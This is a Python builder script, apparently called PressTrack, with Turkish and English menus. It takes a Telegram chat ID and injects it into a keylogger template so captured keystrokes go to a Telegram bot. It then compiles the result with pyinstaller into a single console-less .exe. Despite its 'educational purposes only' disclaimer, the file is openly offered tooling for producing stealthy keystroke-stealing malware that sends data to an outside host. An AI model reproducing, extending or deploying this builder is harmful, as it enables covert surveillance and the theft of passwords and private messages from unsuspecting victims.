import os
import sys
import time
from pyfiglet import figlet_format

# Tool Bilgileri
TOOL_NAME = "PressTrack"
AUTHOR = "NewOnlySquad"
DISCLAIMER_TR = "\033[1;31m[!] Bu araç yalnızca eğitim amaçlıdır. Illegal aktivitelerden sorumlu değiliz.\033[0m"
DISCLAIMER_EN = "\033[1;31m[!] This tool is for educational purposes only. We are not responsible for any illegal activities.\033[0m"

HELP_TEXT_TR = """
================ YARDIM MENÜSÜ =================
Bu araç, kişiselleştirilmiş bir keylogger oluşturmanıza yardımcı olur.

1. Telegram Chat ID'nizi girin.
2. Keylogger dosyanız için bir isim seçin.
3. Opsiyonel olarak bir logo ekleyebilirsiniz.
4. Araç, düzenlenmiş keylogger dosyanızı oluşturur.
5. Son olarak, betik bir .exe dosyasına dönüştürülür.

Çıktılar:
- Düzenlenmiş betik 'output/' klasörüne kaydedilir.
- Final .exe dosyası 'dist/' klasörüne kaydedilir.
===============================================
"""

HELP_TEXT_EN = """
================ HELP MENU =================
This tool helps you build a customized keylogger.

1. Enter your Telegram Chat ID.
2. Choose a filename for your keylogger script.
3. Optionally, provide a path to a logo.
4. The tool generates a modified keylogger script.
5. Finally, the script is compiled into an executable file.

Output files:
- The modified script is saved in the 'output/' folder.
- The final .exe file is saved in the 'dist/' folder.
============================================
"""

def select_language():
    os.system("cls" if os.name == "nt" else "clear")
    print("[1] Türkçe")
    print("[2] English")
    choice = input("\nDil Seçin / Select Language: ")
    return "tr" if choice == "1" else "en"

def print_banner(lang):
    os.system("cls" if os.name == "nt" else "clear")
    print(f"\033[1;32m{figlet_format(TOOL_NAME)}\033[0m")  # Büyük ve havalı başlık
    print(f"\033[1;34mby {AUTHOR}\033[0m")  # Mavi isim
    print((DISCLAIMER_TR if lang == "tr" else DISCLAIMER_EN) + "\n")

def show_help(lang):
    print(HELP_TEXT_TR if lang == "tr" else HELP_TEXT_EN)
    input("\nDevam etmek için Enter'a basın... / Press Enter to return to the main menu...")
    main(lang)

def get_user_input(lang):
    bildiri = input("[+] {}: ".format("Lütfen önce https://t.me/Key_Logger_MyBOT bu botu telegram hesabınızdan başlatın." if lang == "tr" else "Please Start This Bot From Your Telegram Account(https://t.me/Key_Logger_MyBOT)"))
    chat_id = input("[+] Telegram Chat ID: ")
    file_name = input("[+] {}: ".format("Kaydedilecek dosya adı (örneğin: my_keylogger.py)" if lang == "tr" else "Filename for the script (e.g., my_keylogger.py)"))
    logo_path = input("[+] {}: ".format("Bir logo eklemek ister misiniz? (Dosya yolu, boş geçmek için Enter)" if lang == "tr" else "Would you like to add a logo? (File path, press Enter to skip)"))
    return chat_id, file_name, logo_path

def modify_keylogger(chat_id, file_name, logo_path, lang):
    with open("keylogger.py", "r", encoding="utf-8") as file:
        content = file.read()
    
    content = content.replace("TELEGRAM_CHAT_ID", chat_id)
    
    os.makedirs("output", exist_ok=True)
    output_path = os.path.join("output", file_name)
    
    with open(output_path, "w", encoding="utf-8") as file:
        if logo_path and os.path.exists(logo_path):
            with open(logo_path, "rb") as logo:
                file.write(f"# Logo (Base64 Encoded)\n{logo.read().hex()}\n\n")
        file.write(content)
    
    print(f"[✔] {'Keylogger yapılandırıldı' if lang == 'tr' else 'Keylogger configured'}: {output_path}")

def compile_to_exe(file_name, lang):
    print("[⏳] {}...".format(".exe dosyası oluşturuluyor" if lang == "tr" else "Creating .exe file"))
    os.makedirs("dist", exist_ok=True)
    os.system(f"pyinstaller --onefile --noconsole --distpath dist output/{file_name}")
    print(f"[✔] {'EXE dosyası oluşturuldu' if lang == 'tr' else 'EXE file created'}: dist/{file_name.replace('.py', '.exe')}")

def main(lang):
    print_banner(lang)
    print("[1] {}".format("Devam Et" if lang == "tr" else "Continue"))
    print("[2] {}".format("Yardım" if lang == "tr" else "Help"))
    choice = input("\n{}: ".format("Bir seçenek seçin" if lang == "tr" else "Select an option"))
    
    if choice == "2":
        show_help(lang)
    elif choice == "1":
        chat_id, file_name, logo_path = get_user_input(lang)
        modify_keylogger(chat_id, file_name, logo_path, lang)
        compile_to_exe(file_name, lang)
    else:
        print("[!] {}".format("Geçersiz seçim. Çıkılıyor..." if lang == "tr" else "Invalid choice. Exiting..."))
        sys.exit()

if __name__ == "__main__":
    lang = select_language()
    main(lang)

#It was made by Newonlysquad.